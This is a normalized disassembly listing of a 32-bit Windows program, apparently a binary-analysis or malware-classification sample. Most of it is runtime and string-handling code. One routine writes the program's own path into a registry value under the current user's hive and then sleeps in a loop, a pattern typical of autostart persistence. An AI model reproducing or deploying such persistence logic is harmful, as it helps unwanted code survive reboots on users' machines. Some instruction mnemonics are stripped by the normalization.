mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] bl
mov esi r--data
dec al
pop edi
mov [ ecx ] al
mov eax esi
pop esi
pop ebx
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
sub_406590
push 0xffffffff
push sub_40e2f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
mov al [ esp + 0x28 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x34 ]
push edi
mov [ esp + 0x14 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
xor ebx ebx
push 0x1
[ edi ]
not ecx
dec ecx
mov [ esp + 0x14 ] ebx
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_402e80
test al al
je r-xdata
mov esi [ esp + 0x3c ]
or edi 0xffffffff
mov [ esp + 0x2c ] ebx
mov eax [ esi + 0x8 ]
cmp eax 0xffffffff
jae r-xdata
mov edi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_402e60
mov edx [ esp + 0x1c ]
or eax 0xffffffff
sub eax edx
cmp eax edi
ja r-xdata
mov edi eax
cmp edi ebx
jbe r-xdata
call sub_406b1b
mov esi [ esp + 0x34 ]
mov cl [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
mov [ esi ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov edx [ r--data ]
mov ecx esi
push edx
push ebx
push eax
call sub_402a00
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x1c ]
push ebx
lea ebp [ ecx + edi ]
lea ecx [ esp + 0x18 ]
push ebp
call sub_402e80
test al al
je r-xdata
mov ecx [ esp + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov esi [ esi + 0x4 ]
cmp esi ebx
jne r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx edi
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] bl
mov esi r--data
dec al
mov [ ecx ] al
jmp r-xdata
sub_4066e0
push 0xffffffff
push sub_40e321
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
mov [ esp + 0x10 ] ebp
xor edi edi
cmp ebp edi
mov [ esp + 0x1c ] edi
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov esi [ esp + 0x28 ]
mov al [ esi ]
mov [ ebp + 0x4 ] edi
mov [ ebp ] al
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] edi
mov ecx [ esi + 0x8 ]
mov eax [ r--data ]
mov ebx ecx
cmp eax ebx
jae r-xdata
cmp ebp esi
jne r-xdata
mov ebx eax
cmp ebx edi
jbe r-xdata
cmp ebx edi
mov esi eax
jbe r-xdata
push 0x1
push ebx
mov ecx ebp
call sub_402e80
test al al
je r-xdata
cmp ebx ecx
jne r-xdata
mov ecx ebp
call sub_4030c0
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax esi
jae r-xdata
call sub_406d47
mov esi [ esi + 0x4 ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
cmp esi edi
jbe r-xdata
mov esi eax
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ecx + ebx ] 0x0
mov esi r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
call sub_4030c0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ ebp + 0x4 ]
sub eax esi
add ebx ecx
push eax
lea edx [ ebx + esi ]
push edx
push ebx
call sub_407270
mov ebx [ ebp + 0x8 ]
add esp 0xc
sub ebx esi
mov ecx ebp
push edi
push ebx
call sub_402e80
test al al
je r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
mov eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
push ebx
mov ecx ebp
call sub_402e60
mov [ ebp + 0x4 ] eax
mov ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
pop edi
inc cl
pop esi
pop ebp
mov [ eax - 0x1 ] cl
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax r--data
sub_406850
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov al [ esp + 0x8 ]
mov [ esi + 0x4 ] 0x0
test al 0x1
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
add esp 0x4
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_4068b0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi ebp
or ecx 0xffffffff
xor eax eax
mov edx [ esi + 0x8 ]
[ edi ]
not ecx
dec ecx
mov ebx ecx
mov ecx edx
cmp edx ebx
jb r-xdata
mov esi [ esi + 0x4 ]
mov edi ebp
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx ebx
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
cmp edx ebx
jae r-xdata
xor eax eax
cmp edx ebx
setne al
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
sub_406910
push ebx
push esi
mov esi ecx
push edi
mov edi [ esp + 0x10 ]
cmp [ esi + 0x8 ] edi
jae r-xdata
mov eax [ esi + 0x8 ]
mov edx [ esp + 0x14 ]
sub eax edi
cmp eax edx
jae r-xdata
call sub_406d47
mov ebx [ esp + 0x1c ]
mov ecx edx
cmp edx ebx
jb r-xdata
mov edx eax
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx ebx
lea esi [ eax + edi ]
xor esi esi
jmp r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi [ esp + 0x18 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
pop edi
pop esi
pop ebx
retn 0x10
cmp edx ebx
jae r-xdata
xor eax eax
cmp edx ebx
setne al
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn 0x10
sub_4069b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e33b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x31c
lea eax [ esp + 0x11c ]
push esi
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x1c ]
push 0x104
lea edx [ esp + 0x124 ]
push ecx
push edx
call [ GetShortPathNameA@IAT ]
lea eax [ esp + 0x1c ]
push eax
push rw-data
push rw-data
push 0x80000001
call sub_406a60
mov esi [ Sleep@IAT ]
add esp 0x10
lea ecx [ esp + 0x4 ]
call sub_403440
lea ecx [ esp + 0x4 ]
mov [ esp + 0x328 ] 0x0
call sub_403480
push 0x927c0
call esi
lea ecx [ esp + 0x4 ]
mov [ esp + 0x328 ] 0xffffffff
call sub_403470
jmp r-xdata
sub_406a60
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0xc ]
push 0x0
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push esi
push ecx
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
mov esi [ esp + 0x14 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
push 0x1
push eax
mov eax [ esp + 0x20 ]
push esi
push eax
call [ RegSetValueExA@IAT ]
test eax eax
pop edi
je r-xdata
mov edx [ esp + 0xc ]
push edx
call [ RegCloseKey@IAT ]
push esi
push rw-data
call sub_407c15
add esp 0x8
or eax 0xffffffff
pop esi
retn
mov edx [ esp + 0xc ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
retn
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
push esi
push rw-data
call sub_407c15
add esp 0x8
or eax 0xffffffff
pop esi
retn
sub_406b1b
mov eax sub_40e350
call sub_407f1c
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_402ca0
mov esi r--data
push esi
call sub_407ea0
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_402c00
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_406b75
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_407f3b
pop esi
mov eax sub_40e364
call sub_407f1c
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_407db9
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_402ca0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_402a00
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_406b75
mov eax sub_40e364
call sub_407f1c
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_407db9
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_402ca0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_402a00
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_406c03
mov eax sub_40e378
call sub_407f1c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402ca0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_407e40
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_406c5c
mov eax sub_40e38c
call sub_407f1c
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_407df6
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_402ca0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_402a00
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_406cb9
mov eax sub_40e3a0
call sub_407f1c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402ca0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_407e40
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_406cf6
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_406d2f
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_407f3b
push esi
mov esi ecx
call sub_406cb9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
pop ecx
sub_406d47
mov eax sub_40e3b4
call sub_407f1c
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_402ca0
mov esi r--data
push esi
call sub_407ea0
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_402c00
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_406b75
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_407f3b
pop esi
sub_406da1
mov eax sub_40e3c8
call sub_407f1c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402ca0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_407e40
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_406dde
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_406e17
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_407f3b
push esi
mov esi ecx
call sub_406da1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
pop ecx
sub_406e72
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_406e8f
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_406ed1
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_406f20
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4082b5
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_406f56
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_406faa
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_408ab0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_406faa
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_4082b5
add esp 0x20
pop ebp
retn
sub_406fcf
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_407083
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_407083
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_4082b5
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_406ed1
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4070f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_408b52
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_408b52
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_407174
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4071b6
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_407194
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40724a
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_407270
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4072d0 ]
jmp [ ecx * 4 + jump_table_40734c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4073b8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4073b8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_407550 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_407458 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407550 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4073b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4073b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4073b8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_407550 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407550 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407550 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_407550 ]
sub_4075b3
push esi
push [ rw-data ]
call sub_408e3e
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
pop esi
jae r-xdata
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
retn
push edx
call sub_408e3e
add eax 0x10
push eax
push [ rw-data ]
call sub_408c1c
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
retn
sub_407632
push 0x80
call sub_408ba8
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_407d25
mov eax [ rw-data ]
pop ecx
sub_407661
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_408f80
push esi
mov edi eax
call sub_408f1a
push [ esi + 0x10 ]
call sub_408e67
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_407d6e
and [ esi + 0x1c ] 0x0
pop ecx
sub_4076b7
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
